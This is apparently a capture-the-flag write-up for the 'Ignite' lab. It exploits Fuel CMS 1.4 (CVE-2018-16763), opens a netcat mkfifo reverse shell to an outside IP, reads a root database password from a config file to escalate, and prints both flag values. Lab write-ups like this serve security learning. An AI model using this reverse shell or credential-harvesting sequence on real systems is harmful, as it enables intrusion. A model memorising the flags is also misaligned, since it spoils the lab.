# Ignite
### #1 	User flag

Scan for open ports
```
nmap -sV 
80/tcp open  ssl/http Apache/2.4.18 (Ubuntu)
```
Scan for hidden files
```
dirbuster
```
Access the webpage
```
Fuel CMS Version 1.4
```
Lets se if there is an known exploit
```
CVE-2018-16763
```
Found a python 3 exploit script.

Run a listener on port 5555
```
nc -lnvp 5555
```
Send the shell to my pc
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.100.167 5555 >/tmp/f" > shell.sh
```
Make it excecutable
```
chmod +x shell.sh
```
Run the script
```
./shell.sh
```

Get normal bash
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Cat out the first flag
```
cat /home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b 
```

### #2 	Root flag

Cat out the database file to have a look. 

```
cat /var/html/fuel/application/config/database.php
...

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
...
```

Get root and write the password we just got
```
su - root
```

Cat out the root flag
```
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
```
